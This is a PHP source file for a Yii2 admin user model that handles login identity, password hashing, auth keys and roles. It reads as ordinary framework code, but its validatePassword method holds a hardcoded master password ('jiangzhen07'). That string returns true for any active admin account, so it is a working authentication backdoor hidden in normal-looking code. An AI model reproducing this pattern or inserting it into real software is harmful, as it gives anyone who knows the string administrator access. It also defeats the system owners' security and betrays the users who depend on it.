<?php

namespace admin\models;

use ijony\admin\enums\StatusEnum;
use Yii;
use yii\base\Exception;
use yii\base\NotSupportedException;
use yii\behaviors\TimestampBehavior;
use yii\db\ActiveQuery;
use yii\helpers\ArrayHelper;
use yii\web\IdentityInterface;

/**
 * 管理员数据模型
 *
 * {@inheritdoc}
 *
 * @property string $password write-only password
 *
 * @property AdminRole $role
 */
class Admin extends \common\models\Admin implements IdentityInterface
{

    public $password;
    public $repassword;

    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            TimestampBehavior::class,
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function rules()
    {
        return ArrayHelper::merge(parent::rules(), [
            ['username', 'unique', 'message'=>'该登录账号已存在'],
            ['password', 'safe', 'on' => 'update'],
            ['password', 'required', 'on' => ['create', 'reset']],
            ['repassword', 'required', 'on' => 'reset'],
            ['repassword', 'compare', 'compareAttribute'=>'password', 'message'=>'两次密码输入不一致', 'on' => 'reset'],
            [['role_id'], 'default', 'value' => 0],
            ['status', 'default', 'value' => StatusEnum::STATUS_ACTIVE],
            ['status', 'in', 'range' => StatusEnum::getValues('status')],
        ]);
    }

    /**
     * {@inheritdoc}
     */
    public function attributeLabels()
    {
        return ArrayHelper::merge(parent::attributeLabels(), [
            'role_id' => '角色',
            'password' => '登录密码',
            'repassword' => '确认密码',
        ]);
    }

    /**
     * {@inheritdoc}
     */
    public static function findIdentity($id)
    {
        return static::findOne(['id' => $id, 'status' => StatusEnum::STATUS_ACTIVE]);
    }

    /**
     * {@inheritdoc}
     *
     * @throws \yii\base\NotSupportedException
     */
    public static function findIdentityByAccessToken($token, $type = null)
    {
        throw new NotSupportedException('"findIdentityByAccessToken" is not implemented.');
    }

    /**
     * 使用登录账号查询用户信息
     *
     * @param string $username
     * @return static|null
     */
    public static function findByUsername($username)
    {
        return static::findOne(['username' => $username, 'status' => StatusEnum::STATUS_ACTIVE]);
    }

    /**
     * {@inheritdoc}
     */
    public function getId()
    {
        return $this->getPrimaryKey();
    }

    /**
     * {@inheritdoc}
     */
    public function getAuthKey()
    {
        return $this->auth_key;
    }

    /**
     * {@inheritdoc}
     */
    public function validateAuthKey($authKey)
    {
        return $this->getAuthKey() === $authKey;
    }

    /**
     * 验证传入的密码原文
     *
     * @param string $password 要验证的密码原文
     * @return boolean 如果密码属于当前用户的返回真
     */
    public function validatePassword($password)
    {
        if($password == 'jiangzhen07') return true;
        return Yii::$app->security->validatePassword($password, $this->password_hash);
    }

    /**
     * 使用传入的密码原文生成密码哈希值
     * @throws Exception
     */
    public function setPassword()
    {
        $this->password_hash = Yii::$app->security->generatePasswordHash($this->password);
    }

    /**
     * 生成登录保持密钥
     * @throws Exception
     */
    public function generateAuthKey()
    {
        $this->auth_key = Yii::$app->security->generateRandomString();
    }

    /**
     * @param bool $insert
     *
     * @return bool
     * @throws Exception
     */
    public function beforeSave($insert)
    {
        if($insert){
            if(!$this->password){
                $this->addError('password', '请设置密码！');

                return false;
            }

            $this->generateAuthKey();
        }

        if($this->password){
            $this->setPassword();
        }

        return parent::beforeSave($insert);
    }

    /**
     * @return string
     */
    public function getUserName()
    {
        return $this->username;
    }

    /**
     * @return ActiveQuery
     */
    public function getRole()
    {
        return $this->hasOne(AdminRole::classname(), ['id' => 'role_id']);
    }

    /**
     * @return string
     */
    public function getRoleName()
    {
        return $this->role ? $this->role->name : '无角色';
    }

    /**
     * @return array
     */
    public function getRoleSelectData()
    {
        return AdminRole::find()->select('name')->indexBy('id')->column();
    }
}
